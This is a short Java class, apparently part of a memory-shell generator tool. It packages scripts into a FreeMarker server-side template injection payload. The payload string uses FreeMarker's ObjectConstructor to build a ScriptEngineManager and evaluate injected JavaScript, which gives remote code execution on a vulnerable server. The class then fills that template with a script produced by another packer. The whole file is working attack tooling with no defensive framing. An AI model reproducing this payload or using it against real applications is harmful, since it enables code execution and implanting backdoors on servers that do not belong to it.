package org.leo.jmg.mem.packer.freemarker;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "Freemarker", order = 100)
public class FreemarkerPacker implements Packer {
    String template = "${'freemarker.template.utility.ObjectConstructor'?new()('javax.script.ScriptEngineManager').getEngineByName('js').eval('{{script}}')}";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return template.replace("{{script}}", script);
    }
}
